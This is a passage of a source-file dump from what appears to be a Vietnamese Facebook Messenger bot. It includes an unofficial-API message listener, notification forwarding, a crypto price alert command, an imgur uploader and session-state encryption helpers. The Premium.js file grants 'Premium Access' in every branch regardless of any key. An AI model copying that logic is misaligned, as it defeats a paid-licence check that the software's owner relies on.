((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).uri,\n                                            width: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).width,\n                                            height: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).height,\n                                            playable: (fetchData.extensible_attachment.story_attachment.media || {}).is_playable || false,\n                                            duration: (fetchData.extensible_attachment.story_attachment.media || {}).playable_duration_in_ms || 0,\n\n                                            subattachments: fetchData.extensible_attachment.subattachments,\n                                            properties: fetchData.extensible_attachment.story_attachment.properties,\n                                        }],\n                                        mentions: {},\n                                        timestamp: parseInt(fetchData.timestamp_precise),\n                                        isGroup: (fetchData.message_sender.id != tid.toString())\n                                    });\n                                    globalCallback(null, {\n                                        type: \"message\",\n                                        senderID: utils.formatID(fetchData.message_sender.id),\n                                        body: fetchData.message.text || \"\",\n                                        threadID: utils.formatID(tid.toString()),\n                                        messageID: fetchData.message_id,\n                                        attachments: [{\n                                            type: \"share\",\n                                            ID: fetchData.extensible_attachment.legacy_attachment_id,\n                                            url: fetchData.extensible_attachment.story_attachment.url,\n\n                                            title: fetchData.extensible_attachment.story_attachment.title_with_entities.text,\n                                            description: fetchData.extensible_attachment.story_attachment.description.text,\n                                            source: fetchData.extensible_attachment.story_attachment.source,\n\n                                            image: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).uri,\n                                            width: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).width,\n                                            height: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).height,\n                                            playable: (fetchData.extensible_attachment.story_attachment.media || {}).is_playable || false,\n                                            duration: (fetchData.extensible_attachment.story_attachment.media || {}).playable_duration_in_ms || 0,\n\n                                            subattachments: fetchData.extensible_attachment.subattachments,\n                                            properties: fetchData.extensible_attachment.story_attachment.properties,\n                                        }],\n                                        mentions: {},\n                                        timestamp: parseInt(fetchData.timestamp_precise),\n                                        isGroup: (fetchData.message_sender.id != tid.toString())\n                                    });\n                            }\n                        } else log.error(\"forcedFetch\", fetchData);\n                    })\n                    .catch((err) => log.error(\"forcedFetch\", err));\n                }\n            }\n            break;\n        case \"ThreadName\":\n        case \"ParticipantsAddedToGroupThread\":\n        case \"ParticipantLeftGroupThread\": {\n            var formattedEvent;\n            try {\n                formattedEvent = utils.formatDeltaEvent(v.delta);\n            } catch (err) {\n                console.log(err);\n                return log.error(\"L·ªói Nh·∫π\", err);\n            }\n            return (!ctx.globalOptions.selfListen && formattedEvent.author.toString() === ctx.userID) || !ctx.loggedIn ? undefined : (function () { globalCallback(null, formattedEvent); })();\n        }\n        case \"NewMessage\": {\n            if (v.delta.attachments != undefined && v.delta.attachments.length == 1 && v.delta.attachments[0].mercury.extensible_attachment != undefined && v.delta.attachments[0].mercury.extensible_attachment.story_attachment.style_list.includes(\"message_live_location\")) {\n                v.delta.class = \"UserLocation\";\n                var fmtMsg;\n                try {\n                    fmtMsg = utils.formatDeltaEvent(v.delta);\n                } catch (err) {\n                    console.log(v.delta);\n                    return log.error(\"L·ªói Nh·∫π\", err);\n                }\n                return (function () { globalCallback(null, fmtMsg); })();\n            }\n        }\n        break;\n    }\n}\n\n\nfunction markDelivery(ctx, api, threadID, messageID) {\n    if (threadID && messageID) {\n        api.markAsDelivered(threadID, messageID, (err) => {\n            if (err) log.error(\"markAsDelivered\", err);\n            else {\n                if (ctx.globalOptions.autoMarkRead) {\n                    api.markAsRead(threadID, (err) => {\n                        if (err) log.error(\"markAsDelivered\", err);\n                    });\n                }\n            }\n        });\n    }\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    var globalCallback = identity;\n    getSeqID = function getSeqID() {\n        ctx.t_mqttCalled = false;\n        defaultFuncs\n            .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then((resData) => {\n                if (utils.getType(resData) != \"Array\") {\n                    if (global.Fca.Require.FastConfig.AutoLogin) {\n                        return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {\n                            return global.Fca.Action('AutoLogin');\n                        });\n                    }\n                    else if (!global.Fca.Require.FastConfig.AutoLogin) {\n                        return global.Fca.Require.logger.Error(global.Fca.Require.Language.Index.ErrAppState);\n                    }\n                    return;\n                }\n                else {\n                    if (resData && resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n                    if (resData[resData.length - 1].successful_results === 0) throw { error: \"getSeqId: there was no successful_results\", res: resData };\n                    if (resData[0].o0.data.viewer.message_threads.sync_sequence_id) {\n                        ctx.lastSeqId = resData[0].o0.data.viewer.message_threads.sync_sequence_id;\n                        listenMqtt(defaultFuncs, api, ctx, globalCallback);\n                    } \n                    else throw { error: \"getSeqId: no sync_sequence_id found.\", res: resData };\n                }\n            })\n            .catch((err) => {\n                log.error(\"getSeqId\", err);\n                if (utils.getType(err) == \"Object\" && err.error === global.Fca.Require.Language.Index.ErrAppState) ctx.loggedIn = false;\n                return globalCallback(err);\n            });\n    };\n\n    return function (callback) {\n        class MessageEmitter extends EventEmitter {\n            stopListening(callback) {\n                callback = callback || (() => { });\n                globalCallback = identity;\n                if (ctx.mqttClient) {\n                    ctx.mqttClient.unsubscribe(\"/webrtc\");\n                    ctx.mqttClient.unsubscribe(\"/rtc_multi\");\n                    ctx.mqttClient.unsubscribe(\"/onevc\");\n                    ctx.mqttClient.publish(\"/browser_close\", \"{}\");\n                    ctx.mqttClient.end(false, function (...data) {\n                        ctx.mqttClient = undefined;\n                    });\n                }\n                global.Fca.Data.StopListening = true;\n            }\n        }\n\n        var msgEmitter = new MessageEmitter();\n        globalCallback = (callback || function (error, message) {\n            if (error) return msgEmitter.emit(\"error\", error);\n            msgEmitter.emit(\"message\", message);\n        });\n\n        //Reset some stuff\n        if (!ctx.firstListen) ctx.lastSeqId = null;\n        ctx.syncToken = undefined;\n        ctx.t_mqttCalled = false;\n\n        //Same request as getThreadList\n        form = {\n            \"av\": ctx.globalOptions.pageID,\n            \"queries\": JSON.stringify({\n                \"o0\": {\n                    \"doc_id\": \"3336396659757871\",\n                    \"query_params\": {\n                        \"limit\": 1,\n                        \"before\": null,\n                        \"tags\": [\"INBOX\"],\n                        \"includeDeliveryReceipts\": false,\n                        \"includeSeqID\": true\n                    }\n                }\n            })\n        };\n\n        if (!ctx.firstListen || !ctx.lastSeqId) getSeqID();\n        else listenMqtt(defaultFuncs, api, ctx, globalCallback);\n        ctx.firstListen = false;\n        return msgEmitter;\n    };\n};","path":null,"size_bytes":42247,"size_tokens":null},"includes/handle/handleNotification.js":{"content":"/**\n * @warn Do not edit code or edit credits\n * @author D-Jukie\n * @source Disme Project\n */\nmodule.exports = function ({ api }) {\n    const moment = require(\"moment\");\n    const botID = api.getCurrentUserID();\n    const form = {\n        av: botID,\n        fb_api_req_friendly_name: \"CometNotificationsDropdownQuery\",\n        fb_api_caller_class: \"RelayModern\",\n        doc_id: \"5025284284225032\",\n        variables: JSON.stringify({\n            \"count\": 5,\n            \"environment\": \"MAIN_SURFACE\",\n            \"menuUseEntryPoint\": true,\n            \"scale\": 1\n        })\n    };\n    try {\n        api.httpPost(\"https://www.facebook.com/api/graphql/\", form, (e, i) => {\n            var a = JSON.parse(i);\n            var data = a.data.viewer\n            const get_minutes_of_time = (d1, d2) => {\n                let ms1 = d1.getTime();\n                let ms2 = d2.getTime();\n                return Math.ceil((ms2 - ms1) / (60 * 1000));\n            };\n            for (let i of data.notifications_page.edges) {\n                if (i.node.row_type !== 'NOTIFICATION') continue\n                var audio = data.notifications_sound_path[1];\n                var count = data.notifications_unseen_count\n                var body = i.node.notif.body.text\n                var link = i.node.notif.url\n                var timestemp = i.node.notif.creation_time.timestamp\n                var time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:mm:ss DD/MM/YYYY\")\n                if (get_minutes_of_time(new Date(timestemp * 1000), new Date()) <= 1) {\n                    var msg = \"\" + \n                        \"=== „Äé üå∏ ùó°ùó¢ùóßùóúùóôùóúùóñùóîùóßùóúùó¢ùó° üå∏ „Äè ===\" +\n                        \"\\n\\n„Äé‚è±Ô∏è„Äè‚Üí ùóßùó∂ùó∫ùó≤: \" + time + \n                        \"\\n„Äéüí¨„Äè‚Üí ùó†ùó≤ùòÄùòÄùóÆùó¥ùó≤: \" + body +\n                        \"\\n„Äéüîó„Äè‚Üí ùóüùó∂ùóªùó∏:\\n\" + link\n                    api.sendMessage(msg, global.config.ADMINBOT[0])\n                }\n            }\n        });\n    }\n    catch(e) {\n        console.log(`ƒê√£ x·∫£y ra l·ªói khi g·ª≠i th√¥ng b√°o: ${e}`)\n    }\n}","path":null,"size_bytes":2114,"size_tokens":null},"utils/log.js":{"content":"const chalk = require('chalk');\nconst gradient = require('gradient-string');\nmodule.exports = (data, option) => {\n  let coloredData = '';\n\n  switch (option) {\n    case 'warn':\n      coloredData = gradient('#3aed34', '#c2ed34').multiline('„Äé WARN „Äè ‚Üí ' + data);\n      console.log(chalk.bold(coloredData));\n      break;\n    case 'error':\n      coloredData = chalk.bold.hex('#FF0000')('„Äé WARN „Äè ‚Üí ') + chalk.bold.red(data);\n      console.log(coloredData);\n      break;\n    default:\n      coloredData = gradient('#ed3491', '#cb34ed', '#347bed', '#deed34').multiline(`${option} : ` + data);\n      console.log(chalk.bold(coloredData));\n      break;\n  }\n};\n\nmodule.exports.loader = (data, option) => {\n  let coloredData = '';\n\n  switch (option) {\n    case 'warn':\n      coloredData = gradient('#00FFFF' , '#00FF33' , '#FFCCFF' , '#ed3491', '#0000FF' , '#cb34ed' ,'#00FF00' , '#347bed' , '#00EE00').multiline('„Äé TatsuYTB „Äè‚Üí' + data);\n      console.log(chalk.bold(coloredData));\n      break;\n    case 'error':\n      coloredData = chalk.bold.hex('#FF0000')('„Äé TatsuYTB „Äè‚Üí') + chalk.bold.red(data);\n      console.log(coloredData);\n      break;\n    default:\n      coloredData = gradient('#ed3491', '#cb34ed', '#347bed','#3366FF' , '#FF3366','#0000FF' , '#00DD00').multiline('„Äé TatsuYTB „Äè‚Üí ' + data);\n      console.log(chalk.bold(coloredData));\n      break;\n  }\n};","path":null,"size_bytes":1380,"size_tokens":null},"lib/color.js":{"content":"// ** modules code by Heyzer...\n// * no edit credit **\nconst chalk = require('chalk')\n\nconst color = (text, color) => {\n    return !color ? chalk.blue(text) : chalk.keyword(color)(text)\n}\n\nconst bgcolor = (text, bgcolor) => {\n\treturn !bgcolor ? chalk.blue(text) : chalk.bgKeyword(bgcolor)(text)\n}\n\nmodule.exports = {\n\tcolor,\n\tbgcolor\n}\n","path":null,"size_bytes":336,"size_tokens":null},"lib/fca-auto/src/unsendMqttMessage.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn function(threadID, messageID ,callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\n        if (!callback && utils.getType(messageID) === \"AsyncFunction\" || !callback && utils.getType(messageID) === \"Function\") messageID = callback;\n\t\t\n        if (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\n        const Payload = {\n            message_id:messageID,\n            thread_key:threadID,\n            sync_group: 1\n        };\n\n        if (messageID != undefined || messageID != null) Payload.reply_metadata = {\n            reply_source_id: messageID,\n            reply_source_type: 1,\n            reply_type: 0\n        };\n\n        const Form = JSON.stringify({\n            app_id: \"2220391788200892\",\n            payload: JSON.stringify({\n                tasks: [{\n                    label: 33,\n                    payload: JSON.stringify(Payload),\n                    queue_name: \"unsend_message\",\n                    task_id: Math.random() * 1001 << 0,\n                    failure_count: null,\n                }],\n                epoch_id: utils.generateOfflineThreadingID(),\n                version_id: '9094446350588544',\n\n            }),\n            request_id: ++ctx.req_ID,\n            type: 3\n        });\n\n\t\tctx.mqttClient.publish('/ls_req', Form,{\n            qos: 1,\n            retain: false,\n        });\n        ctx.callback_Task[ctx.req_ID] = new Object({\n            callback,\n            type: \"unsendMqttMessage\",\n        });\n        \n\t\treturn returnPromise;\n\t};\n};","path":null,"size_bytes":1854,"size_tokens":null},"modules/commands/crypto.js":{"content":"const axios = require('axios');\nconst cron = require('node-cron');\nconst fs = require('fs');\nconst path = require('path');\nconst stringSimilarity = require('string-similarity');\n\nconst cryptoTrackingFile = path.join(__dirname, '/data/crypto.json');\n\nmodule.exports.config = {\n  name: \"crypto\",\n  version: \"1.4.0\",\n  hasPermssion: 3,\n  credits: \"TatsuYTB\",\n  description: \"Theo d√µi gi√° ti·ªÅn m√£ h√≥a v√† c·∫£nh b√°o khi ƒë·∫°t ng∆∞·ª°ng gi√°.\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"crypto follow <crypto_name> <price_threshold> | crypto <crypto_name> [interval] | crypto stop | crypto list\",\n  cooldowns: 5,\n};\n\nlet cryptoList = [];\nlet cryptoListLower = [];\nlet trackInterval = null;\nlet trackingCryptoName = '';\n\nconst binanceApiUrl = 'https://api.binance.com/api/v3/ticker/24hr';\n\nasync function updateCryptoList() {\n  try {\n    const response = await axios.get(binanceApiUrl);\n    cryptoList = response.data.map(crypto => crypto.symbol);\n    cryptoListLower = cryptoList.map(crypto => crypto.toLowerCase());\n  } catch (error) {\n    console.error('Kh√¥ng th·ªÉ c·∫≠p nh·∫≠t danh s√°ch ti·ªÅn m√£ h√≥a t·ª´ Binance:', error);\n  }\n}\n\nupdateCryptoList();\n\nasync function getCryptoInfo(cryptoName) {\n  try {\n    const response = await axios.get(binanceApiUrl);\n    const crypto = response.data.find(c => c.symbol.toLowerCase() === cryptoName.toLowerCase());\n    return crypto ? {\n      price: parseFloat(crypto.lastPrice),\n      priceChange: parseFloat(crypto.priceChange),\n      priceChangePercent: parseFloat(crypto.priceChangePercent)\n    } : null;\n  } catch (error) {\n    console.error(error);\n    return null;\n  }\n}\n\nfunction getClosestCryptoName(cryptoName) {\n  const matches = stringSimilarity.findBestMatch(cryptoName.toLowerCase(), cryptoListLower);\n  return matches.bestMatch.target;\n}\n\nfunction saveTrackingData(data) {\n  try {\n    fs.writeFileSync(cryptoTrackingFile, JSON.stringify(data, null, 2));\n  } catch (error) {\n    console.error('Kh√¥ng th·ªÉ l∆∞u d·ªØ li·ªáu theo d√µi:', error);\n  }\n}\n\nfunction loadTrackingData() {\n  try {\n    if (fs.existsSync(cryptoTrackingFile)) {\n      const data = fs.readFileSync(cryptoTrackingFile);\n      return JSON.parse(data);\n    }\n  } catch (error) {\n    console.error('Kh√¥ng th·ªÉ t·∫£i d·ªØ li·ªáu theo d√µi:', error);\n  }\n  return [];\n}\n\nlet trackingData = loadTrackingData();\n\nmodule.exports.run = async function({ event, api, args }) {\n  if (args.length === 0) {\n    return api.sendMessage(\"Vui l√≤ng nh·∫≠p l·ªánh h·ª£p l·ªá: 'crypto follow <crypto_name> <price_threshold>' ho·∫∑c 'crypto stop' ho·∫∑c 'crypto list'.\", event.threadID);\n  }\n\n  const command = args[0].toLowerCase();\n\n  if (command === 'stop') {\n    if (trackInterval) {\n      trackInterval.stop();\n      trackInterval = null;\n      api.sendMessage(`ƒê√£ d·ª´ng theo d√µi gi√° ${trackingCryptoName.toUpperCase()}.`, event.threadID);\n    } else {\n      api.sendMessage(\"Hi·ªán kh√¥ng c√≥ ti·ªÅn m√£ h√≥a n√†o ƒëang ƒë∆∞·ª£c theo d√µi.\", event.threadID);\n    }\n    trackingData = [];\n    saveTrackingData(trackingData);\n    return;\n  }\n\n  if (command === 'list') {\n    if (trackingData.length === 0) {\n      return api.sendMessage(\"Hi·ªán kh√¥ng c√≥ ti·ªÅn m√£ h√≥a n√†o ƒëang theo d√µi.\", event.threadID);\n    }\n\n    let message = \"Danh s√°ch ti·ªÅn m√£ h√≥a ƒëang theo d√µi:\\n\";\n    trackingData.forEach((track, index) => {\n      message += `${index + 1}. ${track.cryptoName.toUpperCase()}: Ng∆∞·ª°ng $${track.threshold}\\n`;\n    });\n\n    const msg = await api.sendMessage(message, event.threadID);\n\n    global.client.handleReply.push({\n      name: this.config.name,\n      type: 'del',\n      messageID: msg.messageID,\n      author: event.senderID,\n    });\n    return;\n  }\n\n  if (command === 'follow') {\n    if (args.length < 3) {\n      return api.sendMessage(\"Vui l√≤ng nh·∫≠p l·ªánh h·ª£p l·ªá: 'crypto follow <crypto_name> <price_threshold>'.\", event.threadID);\n    }\n\n    const cryptoName = args[1].toUpperCase();\n    const priceThreshold = parseFloat(args[2]);\n\n    if (isNaN(priceThreshold) || priceThreshold <= 0) {\n      return api.sendMessage(\"Ng∆∞·ª°ng gi√° kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p m·ªôt s·ªë l·ªõn h∆°n 0.\", event.threadID);\n    }\n\n    if (!cryptoList.includes(cryptoName)) {\n      const closestCryptoName = getClosestCryptoName(cryptoName);\n      return api.sendMessage(`Kh√¥ng c√≥ ti·ªÅn m√£ h√≥a n√†o ph√π h·ª£p v·ªõi t√™n \"${cryptoName}\". T√™n g·∫ßn ƒë√∫ng l√† \"${closestCryptoName.toUpperCase()}\".`, event.threadID);\n    }\n\n    const cryptoInfo = await getCryptoInfo(cryptoName);\n    if (!cryptoInfo) {\n      return api.sendMessage(`Kh√¥ng th·ªÉ l·∫•y th√¥ng tin gi√° hi·ªán t·∫°i c·ªßa ${cryptoName}.`, event.threadID);\n    }\n\n    const currentPrice = cryptoInfo.price;\n    let message = `ƒê√£ b·∫Øt ƒë·∫ßu theo d√µi ${cryptoName} v·ªõi ng∆∞·ª°ng gi√° $${priceThreshold}.\\nGi√° hi·ªán t·∫°i: $${currentPrice}.`;\n\n    if (currentPrice < priceThreshold) {\n      message += `\\nBot s·∫Ω c·∫£nh b√°o khi gi√° tƒÉng t·ªõi $${priceThreshold}.`;\n    } else {\n      message += `\\nBot s·∫Ω c·∫£nh b√°o khi gi√° gi·∫£m xu·ªëng $${priceThreshold}.`;\n    }\n\n    trackingData.push({ cryptoName, threshold: priceThreshold });\n    saveTrackingData(trackingData);\n\n    api.sendMessage(message, event.threadID);\n  }\n\n  const cryptoName = args[0].toUpperCase();\n\n  if (args.length === 1) {\n    const cryptoInfo = await getCryptoInfo(cryptoName);\n\n    if (cryptoInfo) {\n      const message = `Gi√° hi·ªán t·∫°i c·ªßa ${cryptoName}: $${cryptoInfo.price}\\nThay ƒë·ªïi trong 24h: $${cryptoInfo.priceChange} (${cryptoInfo.priceChangePercent}%)`;\n      return api.sendMessage(message, event.threadID);\n    } else {\n      const closestCryptoName = getClosestCryptoName(cryptoName);\n      return api.sendMessage(`Kh√¥ng c√≥ ti·ªÅn m√£ h√≥a n√†o ph√π h·ª£p v·ªõi t√™n \"${cryptoName}\". T√™n g·∫ßn ƒë√∫ng l√† \"${closestCryptoName.toUpperCase()}\".`, event.threadID);\n    }\n  }\n\n  const interval = parseInt(args[1]);\n\n  if (isNaN(interval) || interval <= 0) {\n    return api.sendMessage(\"Kho·∫£ng th·ªùi gian kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p s·ªë gi√¢y l·ªõn h∆°n 0.\", event.threadID);\n  }\n\n  if (!cryptoList.includes(cryptoName)) {\n    const closestCryptoName = getClosestCryptoName(cryptoName);\n    return api.sendMessage(`Kh√¥ng c√≥ ti·ªÅn m√£ h√≥a n√†o ph√π h·ª£p v·ªõi t√™n \"${cryptoName}\". T√™n g·∫ßn ƒë√∫ng l√† \"${closestCryptoName.toUpperCase()}\".`, event.threadID);\n  }\n\n  if (trackInterval) {\n    trackInterval.stop();\n    trackInterval = null;\n    api.sendMessage(\"ƒê√£ d·ª´ng theo d√µi gi√° ti·ªÅn m√£ h√≥a tr∆∞·ªõc ƒë√≥.\", event.threadID);\n  }\n\n  trackingCryptoName = cryptoName;\n  trackInterval = cron.schedule(`*/${interval} * * * * *`, async () => {\n    const updatedPrice = await getCryptoInfo(cryptoName);\n    if (updatedPrice !== null) {\n      const message = `C·∫≠p nh·∫≠t gi√° ${cryptoName}: $${updatedPrice.price}\\nThay ƒë·ªïi trong 24h: $${updatedPrice.priceChange} (${updatedPrice.priceChangePercent}%)`;\n      api.sendMessage(message, event.threadID);\n    }\n  });\n\n  api.sendMessage(`B·∫Øt ƒë·∫ßu theo d√µi gi√° ${cryptoName} m·ªói ${interval} gi√¢y.`, event.threadID);\n};\n\nmodule.exports.handleReply = async function({ event, api, handleReply }) {\n  if (event.senderID !== handleReply.author) return;\n\n  if (handleReply.type === 'del') {\n    const indexesToDelete = event.body.split(' ').map(i => parseInt(i) - 1);\n\n    if (indexesToDelete.some(isNaN)) {\n      return api.sendMessage(\"Vui l√≤ng nh·∫≠p s·ªë th·ª© t·ª± h·ª£p l·ªá.\", event.threadID);\n    }\n\n    indexesToDelete.sort((a, b) => b - a);  // S·∫Øp x·∫øp gi·∫£m d·∫ßn ƒë·ªÉ tr√°nh thay ƒë·ªïi ch·ªâ s·ªë khi x√≥a\n\n    for (let index of indexesToDelete) {\n      if (index >= 0 && index < trackingData.length) {\n        trackingData.splice(index, 1);\n      } else {\n        return api.sendMessage(`S·ªë th·ª© t·ª± ${index + 1} kh√¥ng h·ª£p l·ªá.`, event.threadID);\n      }\n    }\n\n    saveTrackingData(trackingData);\n\n    if (trackingData.length === 0) {\n      return api.sendMessage(\"ƒê√£ x√≥a h·∫øt ti·ªÅn m√£ h√≥a kh·ªèi danh s√°ch theo d√µi.\", event.threadID);\n    } else {\n      let message = \"Danh s√°ch ti·ªÅn m√£ h√≥a ƒëang theo d√µi sau khi x√≥a:\\n\";\n      trackingData.forEach((track, index) => {\n        message += `${index + 1}. ${track.cryptoName.toUpperCase()}: Ng∆∞·ª°ng $${track.threshold}\\n`;\n      });\n      return api.sendMessage(message, event.threadID);\n    }\n  }\n};\n\n// T√≠nh nƒÉng c·∫£nh b√°o gi√° li√™n t·ª•c\ncron.schedule('*/10 * * * * *', async () => {\n  if (trackingData.length > 0) {\n    for (const track of trackingData) {\n      const cryptoInfo = await getCryptoInfo(track.cryptoName);\n      if (cryptoInfo) {\n        if (cryptoInfo.price >= track.threshold && cryptoInfo.price >= cryptoInfo.price) {\n          api.sendMessage(`C·∫£nh b√°o: Gi√° c·ªßa ${track.cryptoName.toUpperCase()} ƒë√£ tƒÉng l√™n $${cryptoInfo.price}, cao h∆°n ng∆∞·ª°ng $${track.threshold}!`, track.threadID);\n        } else if (cryptoInfo.price <= track.threshold) {\n          api.sendMessage(`C·∫£nh b√°o: Gi√° c·ªßa ${track.cryptoName.toUpperCase()} ƒë√£ gi·∫£m xu·ªëng $${cryptoInfo.price}, th·∫•p h∆°n ng∆∞·ª°ng $${track.threshold}!`, track.threadID);\n        }\n      }\n    }\n  }\n  saveTrackingData(trackingData);\n});\n","path":null,"size_bytes":9243,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/addUserToGroup.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function addUserToGroup(userID, threadID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) throw { error: \"please pass a threadID as a second argument.\" };\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n    \n    if (utils.getType(threadID) !== \"Number\" && utils.getType(threadID) !== \"String\") throw { error: \"ThreadID should be of type Number or String and not \" + utils.getType(threadID) + \".\" };\n\n\n    if (utils.getType(userID) !== \"Array\") userID = [userID];\n\n    var messageAndOTID = utils.generateOfflineThreadingID();\n    var form = {\n      client: \"mercury\",\n      action_type: \"ma-type:log-message\",\n      author: \"fbid:\" + ctx.userID,\n      thread_id: \"\",\n      timestamp: Date.now(),\n      timestamp_absolute: \"Today\",\n      timestamp_relative: utils.generateTimestampRelative(),\n      timestamp_time_passed: \"0\",\n      is_unread: false,\n      is_cleared: false,\n      is_forward: false,\n      is_filtered_content: false,\n      is_filtered_content_bh: false,\n      is_filtered_content_account: false,\n      is_spoof_warning: false,\n      source: \"source:chat:web\",\n      \"source_tags[0]\": \"source:chat\",\n      log_message_type: \"log:subscribe\",\n      status: \"0\",\n      offline_threading_id: messageAndOTID,\n      message_id: messageAndOTID,\n      threading_id: utils.generateThreadingID(ctx.clientID),\n      manual_retry_cnt: \"0\",\n      thread_fbid: threadID\n    };\n\n    for (var i = 0; i < userID.length; i++) {\n      if (utils.getType(userID[i]) !== \"Number\" && utils.getType(userID[i]) !== \"String\") throw { error: \"Elements of userID should be of type Number or String and not \" + utils.getType(userID[i]) + \".\" };\n      form[\"log_message_data[added_participants][\" + i + \"]\"] = \"fbid:\" + userID[i];\n    }\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/send/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) throw { error: \"Add to group failed.\" };\n        if (resData.error) throw resData;\n\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"addUserToGroup\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2699,"size_tokens":null},"modules/commands/imgur.js":{"content":"const imgur = require(\"imgur\");\nconst fs = require(\"fs\");\nconst { downloadFile } = require(\"../../utils/index\");\n\nmodule.exports.config = {\n  name: \"imgur\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"mod\",\n  description: \"Imgur\",\n  commandCategory: \"C√¥ng c·ª•\",\n  usages: \"[reply]\",\n  cooldowns: 5\n}; \n\nmodule.exports.run = async ({ api, event }) => {\n  const { threadID, type, messageReply, messageID } = event;\n  const ClientID = \"f20bdcf02b2f89e\";\n  if (type !== \"message_reply\" || messageReply.attachments.length == 0) return api.sendMessage(\"B·∫°n ph·∫£i reply m·ªôt video, ·∫£nh n√†o ƒë√≥\", threadID, messageID);\n  imgur.setClientId(ClientID);\n  const attachmentSend = [];\n  async function getAttachments(attachments) {\n    let startFile = 0;\n    for (const data of attachments) {\n      const ext = data.type == \"photo\" ? \"jpg\" :\n        data.type == \"video\" ? \"mp4\" :\n          data.type == \"audio\" ? \"m4a\" :\n            data.type == \"animated_image\" ? \"gif\" : \"txt\";\n      const pathSave = __dirname + `/cache/${startFile}.${ext}`\n      ++startFile;\n      const url = data.url;\n      await downloadFile(url, pathSave);\n      attachmentSend.push(pathSave);\n    }\n  }\n  await getAttachments(messageReply.attachments);\n  let msg = \"\", Succes = 0, Error = [];\n  for (const getImage of attachmentSend) {\n    try {\n      const getLink = await imgur.uploadFile(getImage)\n      console.log(getLink);\n      msg += `${getLink.link}\\n`\n      fs.unlinkSync(getImage)\n    } catch {\n      Error.push(getImage);\n      fs.unlinkSync(getImage)\n    }\n  }\n  return api.sendMessage(`${msg}`, threadID);\n}","path":null,"size_bytes":1601,"size_tokens":null},"lib/fca-auto/Extra/Security/Base/Step_1.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\nmodule.exports.EncryptState = function EncryptState(Data,PassWord) { return CryptoJS.AES.encrypt(Data, PassWord).toString(); };\n\nmodule.exports.DecryptState = function DecryptState(Data,PassWord) { return CryptoJS.AES.decrypt(Data, PassWord).toString(CryptoJS.enc.Utf8); };","path":null,"size_bytes":325,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/Premium.js":{"content":"module.exports = async function(SessionID) {\n    try {\n        var userName,Text;\n        var os = require('os');\n        var Database = require(\"../Database\");\n        var { getAll,readyCreate,deleteAll } = require('../ExtraGetThread');\n        if (process.env.REPL_OWNER != undefined) userName = process.env.REPL_OWNER;\n        else if (os.hostname() != null || os.hostname() != undefined) userName = os.hostname();\n        else userName = os.userInfo().username;\n        if (Database(true).has('UserName')) {\n            if (Database(true).get('UserName') != userName) {\n                Database(true).set('Premium', false);\n                Database(true).set('PremiumKey', '');\n                Database(true).set('UserName', userName);\n            }\n        }\n        if (Database(true).has('PremiumKey') && Database(true).get('PremiumKey') != '' && Database(true).has('Premium') && Database(true).get('Premium') == true) {\n            try {\n                Database(true).set('Premium', true);\n                Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n                Database(true).set('UserName', userName);\n                process.env.HalzionVersion = 1973\n                Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n            }\n            catch (error) {\n                Text = \"L·ªói K·∫øt N·ªëi\";\n            }\n        } else if (global.Fca.Require.FastConfig.PreKey) {\n            try {\n                Database(true).set('Premium', true);\n                Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n                Database(true).set('UserName', userName);\n                process.env.HalzionVersion = 1973\n                Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n            }\n            catch (error) {\n                Text = \"L·ªói K·∫øt N·ªëi\";\n            }\n        }\n        else if (!global.Fca.Require.FastConfig.PreKey) {\n            try {\n                Database(true).set('Premium', true);\n                Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n                Database(true).set('UserName', userName);\n                process.env.HalzionVersion = 1973\n                Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n            }\n            catch (error) {\n                Text = \"L·ªói K·∫øt N·ªëi\";\n            }\n        }\n    } catch (e) {\n        try {\n            Database(true).set('Premium', true);\n            